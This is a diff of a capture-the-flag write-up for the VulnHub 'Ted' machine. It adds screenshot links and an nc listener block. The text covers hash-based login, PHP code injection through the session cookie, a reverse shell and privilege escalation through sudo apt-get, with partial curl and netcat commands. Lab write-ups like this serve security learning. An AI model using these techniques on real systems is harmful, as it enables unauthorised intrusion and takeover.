@@ -1,8 +1,13 @@
 
-Discovery
+Ted
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Scanning
-Nmap Scan results
+[+] Command injection in cookie
+[+] PHP reverse shell
+[+] Privilege Escalation by abusing SUDO rights =  apt-get update
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Scan results
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-02 03:46 EDT
@@ -31,16 +36,16 @@ Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds
 
 Only port 80 open
 Browsing to port 80 :  http://192.168.56.103
-
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted-01.png)
 
 There's a login page
 Trying admin : admin as username and password credentials we get a error stating:
 <p>Password hash is not correct, make sure to hash it before submit.</p>
-
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted02.png)
 
 
 We try to encode it with different types of hashed: MD5, SHA1, SHA256. This later one worked submitting a SHA256 hash of admin, instead of the password
-
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted03.png)
 admin : 8C6976E5B5410415BDE908BD4DEE15DFB167A9C873FC4BB8A81F6F2AB448A918
 
 Using this credentials we are able to login to the application.
@@ -48,13 +53,13 @@ The admin panel has just a Search button for retrieving files from the server.
 
 We are unable to retrieve the restricted files, but we have access to /var/lib/php/sessions/
 
-we retrieve the file containing information about the current session of the user admin
-
+We retrieve the file containing information about the current session of the user admin
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted04.png)
 
 
 We try to manipulate the user_pref parameter in the cookie.
 We insert a small php file that executes ifconfig to test code execution.
-
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted05.png)
 
 
 Reverse shell
@@ -74,16 +79,17 @@ curl -i -s -k  -X $'POST' \
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
-Started listener on Kali at port 1234 : 
+Started listener on Kali at port 1234.
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+root@setrus:~# nc -nvlp 1234
+listening on [any] 1234 ...
 
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Upon making the request we get a reverse shell on kali linux
+![Alt Tag](https://raw.githubusercontent.com/setrus/VulnHub/master/Ted/ted06.png)
 
-
-Getting ROOT
-
-
+Getting root
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 root@setrus:~# nc -nvlp 1234
 listening on [any] 1234 ...
